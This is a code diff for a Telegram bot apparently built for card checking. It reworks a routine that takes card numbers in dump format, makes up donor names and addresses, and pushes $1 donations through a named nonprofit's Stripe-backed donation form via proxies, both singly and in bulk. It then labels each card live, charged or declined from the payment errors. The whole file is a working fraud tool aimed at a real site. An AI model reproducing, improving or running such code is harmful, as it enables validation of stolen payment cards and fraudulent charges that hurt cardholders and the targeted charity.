@@ -6,313 +6,354 @@ import html
 import random
 import uuid
 from time import time
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import urlparse, parse_qs, urlencode
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ChatType
 from BOT.tools.proxy import get_proxy
-from faker import Faker
 
 user_locks = {}
 
 
-class StripeChargeGate:
-    """Stripe $1 Charge Gate - Real Checking"""
-    
-    def __init__(self, proxy=None):
-        self.s = requests.Session()
-        self.proxy = proxy
-        self.fake = Faker('en_US')
-        
-        self.user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
+def check_stripe_card(cc, mm, yy, cvv, proxy=None):
+    """Stripe $1 Charge check - EXACT original API"""
+    try:
+        s = requests.Session()
         
         if proxy:
-            self.s.proxies = {'http': proxy, 'https': proxy}
-    
-    def check_card(self, cc, mm, yy, cvv):
-        """Full Stripe $1 charge check via livingroomconversations.org"""
-        try:
-            # Format year
-            if len(yy) == 2:
-                yy = "20" + yy
-            
-            # Format month
-            if len(mm) == 1:
-                mm = "0" + mm
-            
-            # Generate random info
-            full_name = self.fake.name()
-            first_name, last_name = full_name.split(' ', 1) if ' ' in full_name else (full_name, 'Smith')
-            username = "".join(full_name.split()).lower()
-            random_digits = str(random.randint(1000, 9999))
-            email = f"{username}{random_digits}@gmail.com"
-            
-            street = self.fake.street_address()
-            city = self.fake.city()
-            state = self.fake.state_abbr()
-            zip_code = self.fake.zipcode()
-            
-            time_on_page = str(random.randint(100000, 150000))
-            
-            # Step 1: Get initial page
-            headers = {
-                'authority': 'livingroomconversations.org',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-                'referer': 'https://livingroomconversations.org/',
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': self.user_agent,
-            }
+            s.proxies = {'http': proxy, 'https': proxy}
+        
+        # Format year
+        if len(yy) == 2:
+            full_year = "20" + yy
+        else:
+            full_year = yy
+            yy = yy[2:]
+        
+        # Format month
+        if len(mm) == 1:
+            mm = "0" + mm
+        
+        # Generate random user info
+        first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
+        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
+        
+        first_name = random.choice(first_names)
+        last_name = random.choice(last_names)
+        username = (first_name + last_name).lower()
+        random_digits = str(random.randint(1000, 9999))
+        email = f"{username}{random_digits}@gmail.com"
+        
+        streets = ['123 Main St', '456 Oak Ave', '789 Pine Rd', '321 Elm St', '654 Maple Dr']
+        cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix']
+        states = ['NY', 'CA', 'IL', 'TX', 'AZ']
+        zips = ['10001', '90001', '60601', '77001', '85001']
+        
+        idx = random.randint(0, 4)
+        street = streets[idx]
+        city = cities[idx]
+        state = states[idx]
+        zip_code = zips[idx]
+        
+        time_on_page = str(random.randint(100000, 150000))
+        
+        # Step 1: Get initial page
+        headers = {
+            'authority': 'livingroomconversations.org',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'referer': 'https://livingroomconversations.org/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+        }
 
-            self.s.get('https://livingroomconversations.org/donate/', headers=headers, timeout=30)
+        s.get('https://livingroomconversations.org/donate/', headers=headers, timeout=30)
 
-            # Step 2: Get donation form
-            headers = {
-                'authority': 'livingroomconversations.org',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-                'referer': 'https://livingroomconversations.org/donate/',
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-fetch-dest': 'iframe',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'upgrade-insecure-requests': '1',
-                'user-agent': self.user_agent,
-            }
+        # Step 2: Get donation form
+        headers = {
+            'authority': 'livingroomconversations.org',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'referer': 'https://livingroomconversations.org/donate/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'iframe',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+        }
 
-            params = {
-                'givewp-route': 'donation-form-view',
-                'form-id': '1272',
-                'locale': 'en_US',
-            }
+        params = {
+            'givewp-route': 'donation-form-view',
+            'form-id': '1272',
+            'locale': 'en_US',
+        }
 
-            response = self.s.get('https://livingroomconversations.org/', params=params, headers=headers, timeout=30)
-            html_text = response.text
+        response = s.get('https://livingroomconversations.org/', params=params, headers=headers, timeout=30)
+        html_text = response.text
 
-            # Extract donation URL
-            m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', html_text)
-            if not m:
-                return "Declined ❌", "donateUrl not found"
-            
+        # Extract donation URL and signature
+        m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', html_text)
+        if not m:
+            # Try alternative pattern
+            m = re.search(r'givewp-route-signature=([^"&]+)', html_text)
+            if m:
+                sig = m.group(1)
+                exp_m = re.search(r'givewp-route-signature-expiration=([^"&]+)', html_text)
+                exp = exp_m.group(1) if exp_m else ""
+            else:
+                return "Declined ❌", "Form Error"
+        else:
             donate_url = html.unescape(m.group(1))
             q = parse_qs(urlparse(donate_url).query)
-
             sig = q.get("givewp-route-signature", [""])[0]
             exp = q.get("givewp-route-signature-expiration", [""])[0]
 
-            # Step 3: Submit donation form
-            headers = {
-                'authority': 'livingroomconversations.org',
-                'accept': 'application/json',
-                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-                'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
-                'origin': 'https://livingroomconversations.org',
-                'referer': 'https://livingroomconversations.org/?givewp-route=donation-form-view&form-id=1272&locale=en_US',
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': self.user_agent,
-            }
+        if not sig:
+            return "Declined ❌", "Signature Error"
 
-            params = {
-                'givewp-route': 'donate',
-                'givewp-route-signature': sig,
-                'givewp-route-signature-id': 'givewp-donate',
-                'givewp-route-signature-expiration': exp,
-            }
+        # Step 3: Submit donation form
+        headers = {
+            'authority': 'livingroomconversations.org',
+            'accept': 'application/json',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://livingroomconversations.org',
+            'referer': 'https://livingroomconversations.org/?givewp-route=donation-form-view&form-id=1272&locale=en_US',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+        }
 
-            data = {
-                'amount': '1',
-                'currency': 'USD',
-                'donationType': 'single',
-                'subscriptionPeriod': 'one-time',
-                'subscriptionFrequency': '1',
-                'subscriptionInstallments': '0',
-                'formId': '1272',
-                'gatewayId': 'stripe_payment_element',
-                'feeRecovery': '0',
-                'fundId': '1',
-                'firstName': first_name,
-                'lastName': last_name,
-                'anonymous': 'false',
-                'email': email,
-                'country': 'US',
-                'address1': street,
-                'address2': '',
-                'city': city,
-                'state': state,
-                'zip': zip_code,
-                'mailchimp': 'true',
-                'donationBirthday': '',
-                'originUrl': 'https://livingroomconversations.org/donate/',
-                'isEmbed': 'true',
-                'embedId': 'give-form-shortcode-1',
-                'locale': 'en_US',
-                'gatewayData[stripePaymentMethod]': 'card',
-                'gatewayData[stripePaymentMethodIsCreditCard]': 'true',
-                'gatewayData[formId]': '1272',
-                'gatewayData[stripeKey]': 'pk_live_51BI2rXLb2HpJQ5gR82FXaLJG4yQHBmh64hBr5goTxJfUHMkjHTNgdW4CqGqlIHjFDwislSaKW8vnoD5mcpsuqfoY00YhfyMyMY',
-                'gatewayData[stripeConnectedAccountId]': 'acct_1BI2rXLb2HpJQ5gR',
-            }
+        params = {
+            'givewp-route': 'donate',
+            'givewp-route-signature': sig,
+            'givewp-route-signature-id': 'givewp-donate',
+            'givewp-route-signature-expiration': exp,
+        }
 
-            response = self.s.post('https://livingroomconversations.org/', params=params, headers=headers, data=data, timeout=30)
-            
-            try:
-                resp = response.json()
-            except:
-                return "Declined ❌", "Invalid JSON"
+        data = {
+            'amount': '1',
+            'currency': 'USD',
+            'donationType': 'single',
+            'subscriptionPeriod': 'one-time',
+            'subscriptionFrequency': '1',
+            'subscriptionInstallments': '0',
+            'formId': '1272',
+            'gatewayId': 'stripe_payment_element',
+            'feeRecovery': '0',
+            'fundId': '1',
+            'firstName': first_name,
+            'lastName': last_name,
+            'anonymous': 'false',
+            'email': email,
+            'country': 'US',
+            'address1': street,
+            'address2': '',
+            'city': city,
+            'state': state,
+            'zip': zip_code,
+            'mailchimp': 'true',
+            'donationBirthday': '',
+            'originUrl': 'https://livingroomconversations.org/donate/',
+            'isEmbed': 'true',
+            'embedId': 'give-form-shortcode-1',
+            'locale': 'en_US',
+            'gatewayData[stripePaymentMethod]': 'card',
+            'gatewayData[stripePaymentMethodIsCreditCard]': 'true',
+            'gatewayData[formId]': '1272',
+            'gatewayData[stripeKey]': 'pk_live_51BI2rXLb2HpJQ5gR82FXaLJG4yQHBmh64hBr5goTxJfUHMkjHTNgdW4CqGqlIHjFDwislSaKW8vnoD5mcpsuqfoY00YhfyMyMY',
+            'gatewayData[stripeConnectedAccountId]': 'acct_1BI2rXLb2HpJQ5gR',
+        }
 
-            if "data" not in resp or "clientSecret" not in resp.get("data", {}):
-                return "Declined ❌", "No clientSecret"
+        response = s.post('https://livingroomconversations.org/', params=params, headers=headers, data=data, timeout=30)
+        
+        try:
+            resp = response.json()
+        except:
+            return "Declined ❌", "Invalid JSON Response"
 
-            # Extract client secret and payment intent
-            client_secret = resp["data"]["clientSecret"]
-            payment_intent = client_secret.split("_secret")[0]
-            return_url = resp["data"]["returnUrl"]
+        # Check for errors in response
+        if "error" in resp:
+            err_msg = resp.get("error", {}).get("message", str(resp.get("error", "Error")))
+            return "Declined ❌", str(err_msg)[:40]
+        
+        if "data" not in resp:
+            return "Declined ❌", f"No data in response"
+        
+        if "clientSecret" not in resp.get("data", {}):
+            # Try to get error message
+            msg = resp.get("data", {}).get("message", resp.get("message", ""))
+            if msg:
+                return "Declined ❌", str(msg)[:40]
+            return "Declined ❌", "No clientSecret"
 
-            # Parse query params
+        # Extract client secret and payment intent
+        client_secret = resp["data"]["clientSecret"]
+        payment_intent = client_secret.split("_secret")[0]
+        return_url = resp["data"].get("returnUrl", "")
+
+        # Parse query params for receipt
+        if return_url:
             qs = parse_qs(urlparse(return_url).query)
             receipt_id = qs.get("givewp-receipt-id", [""])[0] or qs.get("receipt-id", [""])[0]
+        else:
+            receipt_id = ""
 
-            if receipt_id:
-                final_return_url = (
-                    "https://livingroomconversations.org/donate/"
-                    "?givewp-event=donation-completed"
-                    "&givewp-listener=show-donation-confirmation-receipt"
-                    f"&givewp-receipt-id={receipt_id}"
-                    "&givewp-embed-id=give-form-shortcode-1"
-                )
-            else:
-                final_return_url = return_url
-
-            # Step 4: Confirm payment with Stripe
-            headers = {
-                'authority': 'api.stripe.com',
-                'accept': 'application/json',
-                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://js.stripe.com',
-                'referer': 'https://js.stripe.com/',
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-site',
-                'user-agent': self.user_agent,
-            }
-
-            data = {
-                "return_url": final_return_url,
-                "payment_method_data[billing_details][name]": f"{first_name} {last_name}",
-                "payment_method_data[billing_details][email]": email,
-                "payment_method_data[billing_details][address][city]": city,
-                "payment_method_data[billing_details][address][country]": "US",
-                "payment_method_data[billing_details][address][line1]": street,
-                "payment_method_data[billing_details][address][line2]": "",
-                "payment_method_data[billing_details][address][postal_code]": zip_code,
-                "payment_method_data[billing_details][address][state]": state,
-                "payment_method_data[type]": "card",
-                "payment_method_data[card][number]": cc,
-                "payment_method_data[card][cvc]": cvv,
-                "payment_method_data[card][exp_year]": yy[-2:],
-                "payment_method_data[card][exp_month]": mm,
-                "payment_method_data[allow_redisplay]": "unspecified",
-                "payment_method_data[payment_user_agent]": "stripe.js/6675c28e57; stripe-js-v3/6675c28e57; payment-element; deferred-intent; autopm",
-                "payment_method_data[referrer]": "https://livingroomconversations.org",
-                "payment_method_data[time_on_page]": time_on_page,
-                "payment_method_data[client_attribution_metadata][client_session_id]": str(uuid.uuid4()),
-                "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
-                "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
-                "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
-                "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
-                "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
-                "payment_method_data[client_attribution_metadata][elements_session_config_id]": str(uuid.uuid4()),
-                "payment_method_data[guid]": str(uuid.uuid4()),
-                "payment_method_data[muid]": str(uuid.uuid4()),
-                "payment_method_data[sid]": str(uuid.uuid4()),
-                "expected_payment_method_type": "card",
-                "client_context[currency]": "usd",
-                "client_context[mode]": "payment",
-                "use_stripe_sdk": "true",
-                "key": "pk_live_51BI2rXLb2HpJQ5gR82FXaLJG4yQHBmh64hBr5goTxJfUHMkjHTNgdW4CqGqlIHjFDwislSaKW8vnoD5mcpsuqfoY00YhfyMyMY",
-                "_stripe_account": "acct_1BI2rXLb2HpJQ5gR",
-                "client_secret": client_secret
-            }
-
-            response = self.s.post(
-                f'https://api.stripe.com/v1/payment_intents/{payment_intent}/confirm',
-                headers=headers,
-                data=data,
-                timeout=30
+        if receipt_id:
+            final_return_url = (
+                "https://livingroomconversations.org/donate/"
+                "?givewp-event=donation-completed"
+                "&givewp-listener=show-donation-confirmation-receipt"
+                f"&givewp-receipt-id={receipt_id}"
+                "&givewp-embed-id=give-form-shortcode-1"
             )
+        else:
+            final_return_url = return_url or "https://livingroomconversations.org/donate/"
+
+        # Step 4: Confirm payment with Stripe
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+        }
+
+        guid = str(uuid.uuid4())
+        muid = str(uuid.uuid4())
+        sid = str(uuid.uuid4())
+        session_id = str(uuid.uuid4())
+        config_id = str(uuid.uuid4())
+
+        data = {
+            "return_url": final_return_url,
+            "payment_method_data[billing_details][name]": f"{first_name} {last_name}",
+            "payment_method_data[billing_details][email]": email,
+            "payment_method_data[billing_details][address][city]": city,
+            "payment_method_data[billing_details][address][country]": "US",
+            "payment_method_data[billing_details][address][line1]": street,
+            "payment_method_data[billing_details][address][line2]": "",
+            "payment_method_data[billing_details][address][postal_code]": zip_code,
+            "payment_method_data[billing_details][address][state]": state,
+            "payment_method_data[type]": "card",
+            "payment_method_data[card][number]": cc,
+            "payment_method_data[card][cvc]": cvv,
+            "payment_method_data[card][exp_year]": yy,
+            "payment_method_data[card][exp_month]": mm,
+            "payment_method_data[allow_redisplay]": "unspecified",
+            "payment_method_data[payment_user_agent]": "stripe.js/6675c28e57; stripe-js-v3/6675c28e57; payment-element; deferred-intent; autopm",
+            "payment_method_data[referrer]": "https://livingroomconversations.org",
+            "payment_method_data[time_on_page]": time_on_page,
+            "payment_method_data[client_attribution_metadata][client_session_id]": session_id,
+            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
+            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
+            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
+            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
+            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
+            "payment_method_data[client_attribution_metadata][elements_session_config_id]": config_id,
+            "payment_method_data[guid]": guid,
+            "payment_method_data[muid]": muid,
+            "payment_method_data[sid]": sid,
+            "expected_payment_method_type": "card",
+            "client_context[currency]": "usd",
+            "client_context[mode]": "payment",
+            "use_stripe_sdk": "true",
+            "key": "pk_live_51BI2rXLb2HpJQ5gR82FXaLJG4yQHBmh64hBr5goTxJfUHMkjHTNgdW4CqGqlIHjFDwislSaKW8vnoD5mcpsuqfoY00YhfyMyMY",
+            "_stripe_account": "acct_1BI2rXLb2HpJQ5gR",
+            "client_secret": client_secret
+        }
+
+        response = s.post(
+            f'https://api.stripe.com/v1/payment_intents/{payment_intent}/confirm',
+            headers=headers,
+            data=data,
+            timeout=30
+        )
+        
+        try:
+            resp_json = response.json()
+        except:
+            return "Declined ❌", "Invalid Stripe Response"
+
+        # Parse response
+        if 'error' in resp_json:
+            error = resp_json['error']
+            message = error.get('message', 'Declined')
+            code = error.get('decline_code', error.get('code', ''))
             
-            try:
-                resp_json = response.json()
-            except:
-                return "Declined ❌", "Invalid Response"
-
-            # Parse response
-            if 'error' in resp_json:
-                error = resp_json['error']
-                message = error.get('message', 'Declined')
-                code = error.get('decline_code', error.get('code', ''))
-                
-                msg_lower = message.lower()
-                code_lower = str(code).lower()
-                
-                # CVV/CVC errors = Approved (Live)
-                if 'cvc' in msg_lower or 'cvv' in msg_lower or 'security code' in msg_lower:
-                    return "Approved ✅", f"CVV Error"
-                # Insufficient funds = Approved (Live)
-                elif 'insufficient' in msg_lower or 'insufficient_funds' in code_lower:
-                    return "Approved ✅", "Insufficient Funds"
-                # 3D Secure = Approved
-                elif 'authentication' in msg_lower or '3d' in msg_lower:
-                    return "Approved ✅", "3D Secure"
-                # Do not honor = Declined
-                elif 'do_not_honor' in code_lower or 'do not honor' in msg_lower:
-                    return "Declined ❌", "Do Not Honor"
-                # Generic decline
-                elif 'decline' in msg_lower or 'declined' in msg_lower:
-                    return "Declined ❌", message[:40]
-                # Card errors
-                elif 'card' in msg_lower and ('invalid' in msg_lower or 'incorrect' in msg_lower):
-                    return "Declined ❌", message[:40]
-                # Expired
-                elif 'expired' in msg_lower:
-                    return "Declined ❌", "Expired Card"
-                else:
-                    return "Declined ❌", message[:40] if message else code[:40]
-
-            status_val = resp_json.get('status', '')
-            if status_val == 'succeeded':
-                return "Charged 💎", "Charged $1"
-            elif status_val == 'requires_action':
-                return "Approved ✅", "3D Secure Required"
+            msg_lower = message.lower()
+            code_lower = str(code).lower()
+            
+            # CVV/CVC errors = Approved (Live card)
+            if 'cvc' in msg_lower or 'cvv' in msg_lower or 'security code' in msg_lower:
+                return "Approved ✅", "CVV Error"
+            # Insufficient funds = Approved (Live card)
+            elif 'insufficient' in msg_lower or 'insufficient_funds' in code_lower:
+                return "Approved ✅", "Insufficient Funds"
+            # 3D Secure = Approved
+            elif 'authentication' in msg_lower or '3d' in msg_lower:
+                return "Approved ✅", "3D Secure"
+            # Do not honor = Declined
+            elif 'do_not_honor' in code_lower or 'do not honor' in msg_lower:
+                return "Declined ❌", "Do Not Honor"
+            # Declined
+            elif 'decline' in msg_lower or 'declined' in msg_lower:
+                return "Declined ❌", message[:40]
+            # Invalid/Incorrect card
+            elif 'card' in msg_lower and ('invalid' in msg_lower or 'incorrect' in msg_lower):
+                return "Declined ❌", message[:40]
+            # Expired
+            elif 'expired' in msg_lower:
+                return "Declined ❌", "Expired Card"
+            # Lost/Stolen
+            elif 'lost' in msg_lower or 'stolen' in msg_lower:
+                return "Declined ❌", "Lost/Stolen Card"
+            # Generic decline
             else:
-                return "Declined ❌", f"Status: {status_val}"
+                return "Declined ❌", message[:40] if message else code[:40]
 
-        except requests.exceptions.Timeout:
-            return "Declined ❌", "Timeout"
-        except requests.exceptions.ProxyError:
-            return "Declined ❌", "Proxy Error"
-        except requests.exceptions.ConnectionError:
-            return "Declined ❌", "Connection Error"
-        except Exception as e:
-            return "Declined ❌", str(e)[:40]
+        status_val = resp_json.get('status', '')
+        if status_val == 'succeeded':
+            return "Charged 💎", "Charged $1"
+        elif status_val == 'requires_action':
+            return "Approved ✅", "3D Secure Required"
+        elif status_val == 'requires_capture':
+            return "Charged 💎", "Authorized"
+        elif status_val == 'processing':
+            return "Approved ✅", "Processing"
+        else:
+            return "Declined ❌", f"Status: {status_val[:30]}"
+
+    except requests.exceptions.Timeout:
+        return "Declined ❌", "Timeout"
+    except requests.exceptions.ProxyError:
+        return "Declined ❌", "Proxy Error"
+    except requests.exceptions.ConnectionError:
+        return "Declined ❌", "Connection Error"
+    except Exception as e:
+        return "Declined ❌", str(e)[:40]
 
 
 def load_users():
@@ -394,9 +435,8 @@ def extract_cards(text):
     return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)
 
 def check_stripe_charge(cc, mm, yy, cvv, proxy=None):
-    """Stripe $1 charge check"""
-    gate = StripeChargeGate(proxy=proxy)
-    return gate.check_card(cc, mm, yy, cvv)
+    """Stripe $1 charge check wrapper"""
+    return check_stripe_card(cc, mm, yy, cvv, proxy)
 
 def is_premium_user(user_id):
     """Check if user is premium"""
@@ -506,7 +546,7 @@ async def stripe_charge_single(client, message):
         )
         
         loop = asyncio.get_event_loop()
-        status, response = await loop.run_in_executor(None, check_stripe_charge, cc, mm, yy, cvv, proxy)
+        status, response = await loop.run_in_executor(None, check_stripe_card, cc, mm, yy, cvv, proxy)
         
         end_time = time()
         timetaken = round(end_time - start_time, 2)
@@ -673,7 +713,7 @@ async def stripe_charge_mass(client, message):
             parts = card.split("|")
             if len(parts) == 4:
                 cc, mm, yy, cvv = parts
-                status, response = await loop.run_in_executor(None, check_stripe_charge, cc, mm, yy, cvv, proxy)
+                status, response = await loop.run_in_executor(None, check_stripe_card, cc, mm, yy, cvv, proxy)
                 
                 final_results.append(
                     f"[•] <b>Card:</b> <code>{card}</code>\n"
